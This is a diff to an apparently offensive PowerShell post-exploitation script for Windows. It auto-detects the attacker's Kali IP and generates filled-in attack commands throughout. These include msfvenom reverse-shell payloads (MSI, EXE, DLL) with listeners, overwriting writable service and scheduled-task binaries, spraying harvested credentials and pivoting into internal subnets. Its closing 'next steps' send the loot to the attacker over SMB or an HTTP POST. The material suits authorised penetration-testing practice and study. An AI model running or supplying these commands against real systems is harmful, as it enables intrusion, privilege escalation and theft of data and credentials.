@@ -25,6 +25,7 @@ param(
     [string]$OutDir = ".\loot",
     [switch]$Quick,
     [string]$Phase = "",
+    [string]$KaliIp = "",
     [switch]$NoColor,
     [switch]$Help
 )
@@ -166,6 +167,24 @@ Write-Info "Hostname: $HostShort"
 Write-Info "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
 if ($Quick) { Write-Warn "Quick mode enabled — skipping slow enumeration" }
 if ($Phase) { Write-Info "Single phase mode: $Phase" }
+
+# Detect Kali IP from active inbound session (RDP 3389, WinRM 5985/5986, SSH 22).
+# The -KaliIp param overrides auto-detection — useful when delivered via reverse shell.
+if (-not $KaliIp) {
+    $KaliIp = (Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
+        Where-Object { $_.LocalPort -in @(3389, 5985, 5986, 22) -and
+                       $_.RemoteAddress -notmatch '^(127\.|::1)' } |
+        Select-Object -First 1).RemoteAddress
+}
+if (-not $KaliIp) { $KaliIp = "<KALI_IP>" }
+Write-Info "Kali IP (for attack commands): $KaliIp"
+
+# Derive this host's primary non-loopback IPv4 for use in pivot/spray commands.
+$ThisHostIp = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+    Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
+    Sort-Object PrefixLength |
+    Select-Object -First 1).IPAddress
+if (-not $ThisHostIp) { $ThisHostIp = $env:COMPUTERNAME }
 
 #==============================================================================
 # PHASE 1 — PROOF FLAGS
@@ -1198,8 +1217,10 @@ function Invoke-AttackCommands {
         if ($aieContent | Select-String "0x1|ENABLED|AlwaysInstallElevated.*1") {
             $HasActions = $true
             $null = $sb.AppendLine("[ AlwaysInstallElevated — MSI PRIVESC ]")
+            $null = $sb.AppendLine("  # On Kali — start listener first:")
+            $null = $sb.AppendLine("  penelope -p 4444 -O")
             $null = $sb.AppendLine("  # Generate malicious MSI on Kali:")
-            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o privesc.msi")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f msi -o privesc.msi")
             $null = $sb.AppendLine("  # Transfer to target and run as current user (installs as SYSTEM):")
             $null = $sb.AppendLine("  msiexec /quiet /qn /i privesc.msi")
             $null = $sb.AppendLine("")
@@ -1216,10 +1237,13 @@ function Invoke-AttackCommands {
             foreach ($svc in $uqContent | Select-Object -First 3) {
                 $null = $sb.AppendLine("  $svc")
             }
-            $null = $sb.AppendLine("  # For each: generate reverse shell and drop in writable path segment:")
-            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  # On Kali — start listener first:")
+            $null = $sb.AppendLine("  penelope -p 4444 -O")
+            $null = $sb.AppendLine("  # Generate reverse shell on Kali and drop in writable path segment:")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
             $null = $sb.AppendLine("  # Copy to path segment (e.g. C:\Program.exe or C:\Program Files\Vuln.exe)")
-            $null = $sb.AppendLine("  sc stop <ServiceName> && sc start <ServiceName>   # trigger it")
+            $null = $sb.AppendLine("  # Check service name from table above, then restart it:")
+            $null = $sb.AppendLine("  sc stop <ServiceName> ; sc start <ServiceName>")
             $null = $sb.AppendLine("")
         }
     }
@@ -1233,11 +1257,18 @@ function Invoke-AttackCommands {
             $null = $sb.AppendLine("[ WRITABLE SERVICE BINARIES ]")
             foreach ($bin in $wsContent | Select-Object -First 3) {
                 $null = $sb.AppendLine("  $bin")
+                # Format: "WRITABLE SERVICE BINARY: C:\path\binary.exe (ServiceName)"
+                $binPath = [regex]::Match($bin, 'BINARY:\s*(.+?)\s*\(').Groups[1].Value.Trim()
+                $svcName = [regex]::Match($bin, '\(([^)]+)\)$').Groups[1].Value.Trim()
+                if (-not $svcName) { $svcName = "<ServiceName>" }
+                if (-not $binPath) { $binPath = "<SERVICE_BINARY_PATH>" }
+                $null = $sb.AppendLine("  # On Kali — start listener first:")
+                $null = $sb.AppendLine("  penelope -p 4444 -O")
+                $null = $sb.AppendLine("  # Generate reverse shell, overwrite binary, restart service:")
+                $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
+                $null = $sb.AppendLine("  copy shell.exe '$binPath'")
+                $null = $sb.AppendLine("  sc stop $svcName ; sc start $svcName")
             }
-            $null = $sb.AppendLine("  # Generate reverse shell, overwrite binary, restart service:")
-            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
-            $null = $sb.AppendLine("  copy shell.exe '<SERVICE_BINARY_PATH>'   # overwrite")
-            $null = $sb.AppendLine("  sc stop <ServiceName> && sc start <ServiceName>")
             $null = $sb.AppendLine("")
         }
     }
@@ -1252,8 +1283,10 @@ function Invoke-AttackCommands {
             foreach ($d in $dllContent | Select-Object -First 3) {
                 $null = $sb.AppendLine("  $d")
             }
+            $null = $sb.AppendLine("  # On Kali — start listener first:")
+            $null = $sb.AppendLine("  penelope -p 4444 -O")
             $null = $sb.AppendLine("  # Generate malicious DLL on Kali:")
-            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o hijack.dll")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f dll -o hijack.dll")
             $null = $sb.AppendLine("  # Drop in writable directory with correct DLL name, restart service/app")
             $null = $sb.AppendLine("")
         }
@@ -1284,9 +1317,10 @@ function Invoke-AttackCommands {
             $null = $sb.AppendLine("[ SCHEDULED TASKS RUNNING AS SYSTEM/ADMIN ]")
             $stContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
             $null = $sb.AppendLine("  # Check if task binary is writable (icacls <path>)")
-            $null = $sb.AppendLine("  # If writable: overwrite with msfvenom reverse shell, wait for trigger")
-            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
-            $null = $sb.AppendLine("  copy shell.exe '<TASK_BINARY_PATH>'")
+            $null = $sb.AppendLine("  # If writable: on Kali start listener, then overwrite binary and wait for trigger:")
+            $null = $sb.AppendLine("  penelope -p 4444 -O")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  copy shell.exe '<TASK_BINARY_PATH>'   # path from table above")
             $null = $sb.AppendLine("")
         }
     }
@@ -1302,7 +1336,7 @@ function Invoke-AttackCommands {
             $null = $sb.AppendLine("[ AUTOLOGON CREDENTIALS FOUND ]")
             $alContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
             $null = $sb.AppendLine("  # Spray on Kali:")
-            $null = $sb.AppendLine("  ./sprayr.sh -u '$alUser' -p '$alPass' -t <TARGET_IP>")
+            $null = $sb.AppendLine("  ./sprayr.sh -u '$alUser' -p '$alPass' -t $ThisHostIp")
             $null = $sb.AppendLine("  # Escalate locally using RunasCs:")
             $null = $sb.AppendLine("  RunasCs.exe $alUser $alPass cmd.exe -b")
             $null = $sb.AppendLine("")
@@ -1319,8 +1353,8 @@ function Invoke-AttackCommands {
             $HasActions = $true
             $null = $sb.AppendLine("[ POWERSHELL HISTORY — CREDENTIAL PATTERNS ]")
             $psContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
-            $null = $sb.AppendLine("  # Extract and spray found passwords:")
-            $null = $sb.AppendLine("  # Copy extracted password to Kali and run: ./sprayr.sh -u <USER> -p '<PASS>' -t <TARGET>")
+            $null = $sb.AppendLine("  # Extract password from lines above, then spray on Kali:")
+            $null = $sb.AppendLine("  ./sprayr.sh -u '$env:USERNAME' -p '<PASS_FROM_HISTORY>' -t $ThisHostIp")
             $null = $sb.AppendLine("")
         }
     }
@@ -1332,29 +1366,41 @@ function Invoke-AttackCommands {
         if ($ilContent) {
             $HasActions = $true
             $null = $sb.AppendLine("[ INTERNAL LISTENERS — PIVOT CANDIDATES ]")
-            $ilContent | Select-Object -First 10 | ForEach-Object { $null = $sb.AppendLine("  $_") }
-            $null = $sb.AppendLine("  # Forward an interesting port to Kali:")
-            $null = $sb.AppendLine("  # On Kali: ./pivotr.sh ssh --type local --pivot-ip <PIVOT_IP> --target-ip 127.0.0.1 --target-port <PORT>")
-            $null = $sb.AppendLine("  # Or: ./pivotr.sh chisel --type forward --target-ip 127.0.0.1 --target-port <PORT>")
+            $null = $sb.AppendLine("  # On Kali, forward each internal port via pivotr.sh:")
+            foreach ($il in $ilContent | Select-Object -First 10) {
+                $null = $sb.AppendLine("  $il")
+                $port = [regex]::Match($il.ToString(), ':(\d+)\s').Groups[1].Value
+                if ($port) {
+                    $null = $sb.AppendLine("  ./pivotr.sh ssh --type local --pivot-ip $ThisHostIp --target-ip 127.0.0.1 --target-port $port")
+                    $null = $sb.AppendLine("  # Or chisel: ./pivotr.sh chisel --type forward --target-ip 127.0.0.1 --target-port $port")
+                }
+            }
             $null = $sb.AppendLine("")
         }
     }
 
     # ── Reachable Subnets ─────────────────────────────────────────────────────
-    $netPath = Join-Path $LootDir "network\interfaces.txt"
-    if (Test-Path $netPath) {
-        $subnets = Get-Content $netPath -ErrorAction SilentlyContinue |
-            Select-String -Pattern "IPv4|IPAddress" |
-            Where-Object { $_ -notmatch "127\.0\.0\.|169\.254\." }
-        if ($subnets) {
-            $HasActions = $true
-            $null = $sb.AppendLine("[ NETWORK INTERFACES — PIVOT TARGETS ]")
-            $subnets | ForEach-Object { $null = $sb.AppendLine("  $_") }
-            $null = $sb.AppendLine("  # Set up Ligolo pivot to reach internal subnet:")
-            $null = $sb.AppendLine("  # On Kali: ./pivotr.sh ligolo --subnet <SUBNET>/24 --serve")
-            $null = $sb.AppendLine("  # Transfer agent to this host and connect back")
-            $null = $sb.AppendLine("")
+    # Query live — more reliable than parsing the saved Format-Table text.
+    $nicList = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+        Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' }
+    if ($nicList) {
+        $HasActions = $true
+        $null = $sb.AppendLine("[ NETWORK INTERFACES — PIVOT TARGETS ]")
+        foreach ($nic in $nicList) {
+            # Compute network address: zero out host bits
+            $ipBytes  = [System.Net.IPAddress]::Parse($nic.IPAddress).GetAddressBytes()
+            $prefix   = $nic.PrefixLength
+            $maskBytes = [byte[]]@(0,0,0,0)
+            for ($i = 0; $i -lt 4; $i++) {
+                $bits = [Math]::Max(0, [Math]::Min(8, $prefix - $i * 8))
+                $maskBytes[$i] = if ($bits -ge 8) { 255 } elseif ($bits -le 0) { 0 } else { [byte](256 - [Math]::Pow(2, 8 - $bits)) }
+            }
+            $netBytes = for ($i = 0; $i -lt 4; $i++) { $ipBytes[$i] -band $maskBytes[$i] }
+            $subnet   = ($netBytes -join '.') + "/$prefix"
+            $null = $sb.AppendLine("  $($nic.InterfaceAlias): $($nic.IPAddress)/$prefix  (subnet: $subnet)")
+            $null = $sb.AppendLine("  ./pivotr.sh ligolo --pivot-ip $ThisHostIp --subnet $subnet --serve")
         }
+        $null = $sb.AppendLine("")
     }
 
     if (-not $HasActions) {
@@ -1409,3 +1455,20 @@ Write-Host ""
 Write-Success "Loot collection complete. Output: $LootDir\"
 Write-Success "Quick review:      Get-Content $LootDir\summary.txt"
 Write-Success "Attack commands:   Get-Content $LootDir\attack_commands.txt"
+
+Write-Host ""
+Write-Host "[NEXT STEPS]" -ForegroundColor Cyan
+Write-Host "  1. Exfil loot to Kali ($KaliIp) — pick one method:" -ForegroundColor White
+Write-Host "       # SMB (if servr.sh smb is running on Kali):" -ForegroundColor Gray
+Write-Host "       copy $LootDir\* \\$KaliIp\share\" -ForegroundColor Green
+Write-Host "       # HTTP POST (if Kali has an upload endpoint):" -ForegroundColor Gray
+Write-Host "       Compress-Archive $LootDir $env:TEMP\loot.zip; iwr -Uri http://${KaliIp}/upload -Method POST -InFile $env:TEMP\loot.zip" -ForegroundColor Green
+Write-Host "  2. Start listener for any reverse shell triggers in attack_commands.txt:" -ForegroundColor White
+Write-Host "       penelope -p 4444 -O" -ForegroundColor Green
+Write-Host "  3. Crack any SAM / NTLM hashes found on Kali:" -ForegroundColor White
+Write-Host "       ./crackr.sh -f <loot_dir>/creds/sam_hashes.txt" -ForegroundColor Green
+Write-Host "  4. Spray any found credentials on Kali:" -ForegroundColor White
+Write-Host "       ./sprayr.sh --from-creds" -ForegroundColor Green
+Write-Host "  5. Read prioritised attack commands:" -ForegroundColor White
+Write-Host "       type $LootDir\attack_commands.txt" -ForegroundColor Green
+Write-Host ""
